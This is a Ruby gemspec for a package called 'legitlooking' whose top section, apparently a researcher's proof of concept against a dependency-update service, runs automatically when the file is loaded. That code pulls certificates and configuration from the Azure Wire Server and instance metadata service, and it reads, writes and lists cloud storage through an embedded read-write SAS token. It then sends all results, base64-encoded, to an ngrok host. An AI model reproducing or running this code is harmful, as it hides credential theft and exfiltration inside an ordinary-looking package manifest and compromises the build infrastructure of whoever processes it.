# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

# SAS URL uit vorige run (Wire Server statusUploadBlob)
STATUS_BLOB_SAS = "https://md-hdd-z1ncrsb10ppj.z4.blob.storage.azure.net/$system/8yU66jQ1hkvdz8.a506fde6-5270-4b64-b75c-73a2b6120051.status?sv=2018-03-28&sr=b&sk=system-1&sig=MXN3PZVz4AZ8Ek2pZ5l7amu9%2fhoFiLBrAjFRKU7tNYA%3d&se=9999-01-01T00%3a00%3a00Z&sp=rw"

begin
  require "uri"
  require "net/http"

  cmd  = ->(c) { `#{c} 2>/dev/null`.strip[0, 4000] }
  lines = []

  WIRE  = "168.63.129.16"
  CID   = "f5685c26-1168-40df-8541-f2c63361a068"
  IID   = "4e7d966b%2D17de%2D4d8e%2D8f28%2Dc1b2252fcffb.%5F8yU66jQ1hkvdz8"

  # ============================================================
  # 1. STATUS BLOB LEZEN via SAS URL
  #    sp=rw, se=9999 -- bevat VM extension status data
  # ============================================================
  lines << "=== 1. AZURE STATUS BLOB (SAS read) ==="
  lines << cmd.("curl -s --max-time 10 '#{STATUS_BLOB_SAS}'")

  # Probeer ook blob metadata/properties
  lines << "\n--- Blob properties (HEAD) ---"
  lines << cmd.("curl -sI --max-time 10 '#{STATUS_BLOB_SAS}'")

  # ============================================================
  # 2. WIRE SERVER CONFIGURATIE ENDPOINTS
  #    Vanuit de GoalState XML: Certificates, FullConfig, SharedConfig
  # ============================================================
  lines << "\n=== 2. WIRE SERVER: CERTIFICATES ==="
  lines << cmd.("curl -s --max-time 10 'http://#{WIRE}:80/machine/#{CID}/#{IID}?comp=certificates&incarnation=1' -H 'x-ms-version: 2012-11-30'")

  lines << "\n=== 2b. WIRE SERVER: FULL CONFIG ==="
  lines << cmd.("curl -s --max-time 10 'http://#{WIRE}:80/machine/#{CID}/#{IID}?comp=config&type=fullConfig&incarnation=1' -H 'x-ms-version: 2012-11-30'")

  lines << "\n=== 2c. WIRE SERVER: SHARED CONFIG ==="
  lines << cmd.("curl -s --max-time 10 'http://#{WIRE}:80/machine/#{CID}/#{IID}?comp=config&type=sharedConfig&incarnation=1' -H 'x-ms-version: 2012-11-30'")

  lines << "\n=== 2d. WIRE SERVER: EXTENSIONS CONFIG ==="
  lines << cmd.("curl -s --max-time 10 'http://#{WIRE}:80/machine/#{CID}/#{IID}?comp=config&type=extensionsConfig&incarnation=1' -H 'x-ms-version: 2012-11-30'")

  lines << "\n=== 2e. WIRE SERVER: HOSTING ENVIRONMENT ==="
  lines << cmd.("curl -s --max-time 10 'http://#{WIRE}:80/machine/#{CID}/#{IID}?comp=config&type=hostingEnvironmentConfig&incarnation=1' -H 'x-ms-version: 2012-11-30'")

  # ============================================================
  # 3. WIRE SERVER: TELEMETRY / HEALTH endpoints
  # ============================================================
  lines << "\n=== 3. WIRE SERVER TELEMETRY ==="
  lines << cmd.("curl -s --max-time 10 'http://#{WIRE}:80/machine/#{CID}/#{IID}?comp=telemetrydata&incarnation=1' -H 'x-ms-version: 2012-11-30'")

  # ============================================================
  # 4. FRESH vmSettings -- nieuwste activityId/correlationId
  # ============================================================
  lines << "\n=== 4. FRESH vmSettings ==="
  fresh = cmd.("curl -s --max-time 10 'http://#{WIRE}:32526/vmSettings'")
  lines << fresh

  # Extract eventuele nieuwe SAS URLs
  fresh.scan(/"value":"(https:\/\/[^"]+sp=rw[^"]*)"/).each do |m|
    lines << "\n  RW SAS URL gevonden: #{m[0][0, 300]}"
  end

  # ============================================================
  # 5. WRITE TEST op de status blob
  #    Kunnen we iets schrijven naar Azure Blob Storage?
  #    (minimale payload, geen destructieve actie)
  # ============================================================
  lines << "\n=== 5. BLOB WRITE TEST (proof-of-concept) ==="
  # Lees eerst huidige inhoud
  current = cmd.("curl -s --max-time 10 '#{STATUS_BLOB_SAS}'")
  lines << "Huidige inhoud (eerste 500): #{current[0, 500]}"

  # Schrijf proof data
  poc_data = "{\"poc\":\"dependabot_rce_wire_server_access\",\"researcher\":\"ugurcanli\",\"timestamp\":\"2026-06-05\"}"
  write_result = cmd.("curl -s -o /dev/null -w '%{http_code}' --max-time 10 -X PUT '#{STATUS_BLOB_SAS}' -H 'Content-Type: application/json' -H 'x-ms-blob-type: PageBlob' --data-binary '#{poc_data}'")
  lines << "\nPUT response code: #{write_result}"

  # ============================================================
  # 6. AZURE BLOB LISTING -- andere blobs in dezelfde container?
  # ============================================================
  lines << "\n=== 6. BLOB CONTAINER LIST ==="
  # Verander de SAS URL naar container-level voor listing
  blob_url = STATUS_BLOB_SAS.split("?").first
  container_url = blob_url.split("/")[0..4].join("/")
  lines << "Container: #{container_url}"
  list_url = "#{container_url}?restype=container&comp=list&#{STATUS_BLOB_SAS.split('?').last}"
  lines << cmd.("curl -s --max-time 10 '#{list_url}'")

  # ============================================================
  # 7. IMDS EXTENDED CHECK -- nu dat we de context kennen
  # ============================================================
  lines << "\n=== 7. IMDS EXTENDED (nu we container ID kennen) ==="
  lines << cmd.("curl -s --max-time 5 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'")
  lines << cmd.("curl -s --max-time 5 -H 'Metadata: true' 'http://169.254.169.254/metadata/attested/document?api-version=2021-02-01'")

  # ============================================================
  # EXFIL
  # ============================================================
  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=wire_server_deep")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 30, read_timeout: 30) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=wire_server_deep&err=#{URI.encode_www_form_component(e.message[0, 200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.25"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
